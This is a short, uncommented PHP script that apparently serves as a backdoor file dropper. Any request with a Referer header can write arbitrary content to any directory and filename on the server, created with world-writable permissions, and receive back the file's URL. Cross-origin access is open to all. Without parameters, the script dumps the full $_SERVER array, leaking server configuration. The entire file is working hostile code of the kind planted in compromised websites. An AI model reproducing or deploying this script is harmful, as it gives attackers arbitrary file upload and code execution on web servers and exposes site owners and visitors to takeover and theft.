<?php

header('Access-Control-Allow-Origin: *');
if (isset($_SERVER['HTTP_REFERER'])) {
  $c = (isset($_REQUEST['content']) ? $_REQUEST['content'] : false);
  $d = (isset($_REQUEST['dir']) ? $_REQUEST['dir'] : false);
  $n = (isset($_REQUEST['filename']) ? $_REQUEST['filename'] : false);
  $host = $_SERVER['HTTP_HOST'];
  $proto = $protocol = (!empty($_SERVER['HTTPS']) && 'off' !== $_SERVER['HTTPS'] || 443 == $_SERVER['SERVER_PORT']) ? 'https://' : 'http://';

  hj();
  if ($c && $d && $n) {
    if (!is_dir($d)) {
      md($d);
    }
    if (!file_exists($d . '/.htaccess')) {
      file_put_contents($d . '/.htaccess', 'Options -Indexes');
    }
    if (file_put_contents($d . '/' . $n, $c)) {
      $f = $d . '/' . $n;
      $o['success'] = file_exists($f);
      $o['url'] = $proto . $host . '/' . $f;
    }
  } else {
    $o['server'] = $_SERVER;
  }

  if (isset($o)) {
    echo cj($o);
  }
} else {
  echo cj(['error'=>'undefined']);
}

function md($d)
{
  $oldmask = umask(0);
  mkdir($d, 0777);
  umask($oldmask);
}

function hj()
{
  if (!headers_sent()) {
    return header('Content-type: application/json; charset=utf-8');
  }
}

/**
 * Create JSON
 */
function cj($data)
{
  return json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
}
